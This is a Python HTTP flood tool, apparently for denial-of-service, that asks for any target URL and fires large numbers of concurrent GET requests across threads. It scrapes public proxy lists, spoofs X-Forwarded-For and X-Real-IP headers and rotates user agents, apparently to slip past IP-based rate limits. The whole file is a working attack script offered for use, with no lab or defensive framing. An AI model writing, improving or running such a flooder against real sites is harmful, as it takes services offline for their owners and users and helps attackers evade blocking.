#!/usr/bin/env python3
import aiohttp
import asyncio
import threading
import random
import itertools
import time
import re
import string
import sys
import shutil
from colorama import Fore, init

init(autoreset=True)

# Short, valid list of user agents (removed accidental concatenations)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/80.0.3987.95 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
]

# Keep the proxy_sources list (trimmed here for brevity). You can re-add entries as needed.
proxy_sources = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/proxies.txt",
    # ... you can include more sources if you like
]

# Fetch proxy sources concurrently but with bounded concurrency
async def fetch_proxy_source(session, url, sem, timeout_seconds=10):
    try:
        async with sem:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout_seconds)) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    # match ip:port or just ip
                    matches = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d+\b", text)
                    return matches
    except Exception:
        return []
    return []

async def gather_proxies(sources, concurrency=10):
    sem = asyncio.Semaphore(concurrency)
    connector = aiohttp.TCPConnector(ssl=False, limit=concurrency)
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = [fetch_proxy_source(session, url, sem) for url in sources]
        results = await asyncio.gather(*tasks, return_exceptions=False)
    all_proxies = [p for sub in results for p in sub]
    # If not enough proxies, generate dummy IPs (useful for X-Forwarded-For testing)
    if len(all_proxies) < 100:
        all_proxies.extend([f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(1000)])
    return all_proxies

class AsyncAttacker:
    def __init__(self, target_url, num_requests, max_concurrent=50, ip_list=None, start_msg=True):
        self.target_url = target_url
        self.num_requests = num_requests
        self.max_concurrent = max_concurrent
        self.ip_list = ip_list or []
        self.success_count = 0
        self.fail_count = 0
        self.start_time = None
        self._print_lock = asyncio.Lock()
        self.start_msg = start_msg

    def _make_headers(self, ip_address):
        return {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": ip_address,
            "X-Real-IP": ip_address,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "Referer": self.target_url,
            "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        }

    async def send_request(self, session, ip_address):
        headers = self._make_headers(ip_address)
        try:
            # per-request timeout to avoid hanging sockets
            async with session.get(self.target_url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                # consider 2xx as success
                if 200 <= resp.status < 300:
                    self.success_count += 1
                else:
                    self.fail_count += 1
        except Exception:
            self.fail_count += 1

    async def worker(self, q, session, worker_id):
        while True:
            try:
                ip_addr = await q.get()
            except asyncio.CancelledError:
                return
            if ip_addr is None:
                q.task_done()
                return
            await self.send_request(session, ip_addr)
            q.task_done()
            # Periodically log (non-blocking)
            total_done = self.success_count + self.fail_count
            if total_done % 50 == 0 and total_done != 0:
                elapsed = time.time() - self.start_time
                rate = total_done / elapsed if elapsed > 0 else 0
                async with self._print_lock:
                    print(Fore.RED + f"[worker {worker_id}] Requests done: {total_done} | Rate: {rate:.1f}/s")

    async def attack(self):
        self.start_time = time.time()
        if self.start_msg:
            print(Fore.CYAN + "Preparing attack...")

        # ensure we have an IP list
        if not self.ip_list:
            # fallback to local-dummy IPs
            self.ip_list = [f"10.0.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(2000)]

        # prepare queue with exactly num_requests items sampled from ip_list
        q = asyncio.Queue()
        ip_cycle = itertools.cycle(self.ip_list)
        for _ in range(self.num_requests):
            await q.put(next(ip_cycle))

        # create session with connector limited to max_concurrent
        connector = aiohttp.TCPConnector(limit=self.max_concurrent, ssl=False)
        timeout = aiohttp.ClientTimeout(total=None)  # per-request timeouts applied on get()
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # spawn worker tasks
            worker_count = min(self.max_concurrent, self.num_requests, 200)
            tasks = [asyncio.create_task(self.worker(q, session, i)) for i in range(worker_count)]
            # wait for all queue items to be processed
            await q.join()
            # cancel workers
            for t in tasks:
                t.cancel()
            # wait for workers to finish gracefully
            await asyncio.gather(*tasks, return_exceptions=True)

        elapsed = time.time() - self.start_time
        return self.success_count, self.fail_count, elapsed

def print_banner():
    columns = shutil.get_terminal_size().columns
    banner = r"""
 █▄░█ █░█ █░░ █░░ █▀ █▀▀ █▀▀
 █░▀█ █▄█ █▄▄ █▄▄ ▄█ ██▄ █▄▄

 █▀█ █░█ █ █░░ █ █▀█ █▀█ █ █▄░█ █▀▀ █▀
 █▀▀ █▀█ █ █▄▄ █ █▀▀ █▀▀ █ █░▀█ ██▄ ▄█

      Made By: Ethical Hex Nicks
"""
    for line in banner.splitlines():
        print(f"{Fore.RED}{line.center(columns)}{Fore.RESET}")

def run_threaded_attack(target_url, total_requests, thread_count):
    # Fetch proxy list once in main thread (avoid repetitive network traffic)
    print(Fore.CYAN + "Fetching proxy list (global)...")
    try:
        ip_list = asyncio.run(gather_proxies(proxy_sources, concurrency=10))
    except Exception:
        ip_list = [f"10.0.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(2000)]

    # split work among threads
    per_thread = total_requests // thread_count
    remainder = total_requests % thread_count

    threads = []
    results = []
    results_lock = threading.Lock()

    def thread_target(tid, assigned_requests):
        # compute per-thread concurrency (distribute overall ~250)
        per_thread_concurrency = max(5, 250 // max(1, thread_count))
        # Each thread uses same ip_list
        attacker = AsyncAttacker(target_url, assigned_requests, max_concurrent=per_thread_concurrency, ip_list=ip_list, start_msg=(tid==0))
        # Each thread has its own event loop
        try:
            # new event loop for this thread
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            success, fail, elapsed = loop.run_until_complete(attacker.attack())
            loop.close()
        except Exception as e:
            success, fail, elapsed = 0, assigned_requests, 0.0
            print(Fore.YELLOW + f"[thread {tid}] exception: {e}")
        with results_lock:
            results.append((tid, success, fail, elapsed))

    # start threads
    for i in range(thread_count):
        assigned = per_thread + (1 if i < remainder else 0)
        t = threading.Thread(target=thread_target, args=(i, assigned), daemon=False)
        threads.append(t)
        t.start()
        time.sleep(0.01)  # tiny stagger to avoid instantaneous spike

    # wait for threads to finish
    for t in threads:
        t.join()

    # aggregate results
    total_success = sum(r[1] for r in results)
    total_fail = sum(r[2] for r in results)
    total_time = sum(r[3] for r in results) if results else 0.0

    print(Fore.BLUE + f"Attack complete. Threads: {thread_count} | Total requests: {total_requests}")
    print(Fore.BLUE + f"Total success: {total_success} | Total fail: {total_fail}")
    print(Fore.BLUE + f"Total elapsed (sum of thread times): {total_time:.2f}s")
    if total_success + total_fail > 0:
        print(Fore.GREEN + f"Overall success rate: {total_success/(total_success+total_fail)*100:.2f}%")

if __name__ == "__main__":
    print_banner()
    target_url = input(Fore.RED + "Enter Target URL: ").strip()
    try:
        total_requests = int(input(Fore.RED + "Enter Total Number of Requests: ").strip())
    except Exception:
        print(Fore.YELLOW + "Invalid number of requests, exiting.")
        sys.exit(1)

    try:
        thread_count = int(input(Fore.RED + "Enter number of threads (OS threads) to use: ").strip())
        if thread_count < 1:
            raise ValueError()
    except Exception:
        print(Fore.YELLOW + "Invalid thread count, using 1.")
        thread_count = 1

    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    run_threaded_attack(target_url, total_requests, thread_count)